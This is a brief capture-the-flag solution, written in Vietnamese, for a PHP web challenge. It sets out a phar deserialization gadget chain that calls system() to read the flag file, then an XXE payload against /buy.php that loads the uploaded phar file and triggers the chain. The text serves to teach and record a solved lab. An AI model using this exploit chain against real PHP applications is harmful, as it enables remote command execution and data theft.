# Solution



Kịch bản khai thác:
- Tạo một phar file với metadata chứa instance của class `Database`
```
$d = new Database();
$d -> is_connected = false
$d -> database = new User()
$d -> database -> username = 'to^'
$d -> database -> avatar = new Utils()
$d -> database -> avatar -> a = 'system'
$d -> database -> avatar -> b = 'cat /n1c3_fl4444g_f0r_r3al_h4ck3r'
```
- Upload lên server, lấy được path của file sau đó trigger phar unserialization với XXE ở `/buy.php`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "phar://<path to phar file>"> ]>
<item><name>&xxe;</name><price>9000</price></item>
```